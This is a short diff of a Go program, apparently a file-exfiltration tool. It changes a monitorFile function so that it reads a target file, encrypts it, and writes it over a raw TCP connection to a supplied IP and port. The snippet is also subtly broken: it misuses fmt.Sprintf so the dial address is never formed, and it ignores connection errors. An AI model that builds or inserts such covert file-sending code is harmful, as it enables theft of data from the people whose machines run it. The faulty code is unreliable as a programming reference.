@@ -30,7 +30,7 @@ import(
 	"time"
 	"os/exec"
 	"bytes"
-	"io"
+	"io/ioutil"
 	"flag"
 	"encoding/binary"
 	"fmt"
@@ -265,13 +265,12 @@ func monitorFile(ip, filename string, port uint16){
 			fmt.Sprintf(target, "%s:%d", ip, port)
 			conn, _ := net.Dial("tcp", target)
 
-			file, err := os.Open(strings.TrimSpace(filename)) // For read access.
+			file, err := ioutil.ReadFile(filename)
 			checkError(err)
 			
-			defer file.Close() // make sure to close the file even if we panic.
+			data := encrypt_data(string(file))
 
-			_, err = io.Copy(conn, file)
-			checkError(err)
+			conn.Write(data)
 			return
 		}
 	}
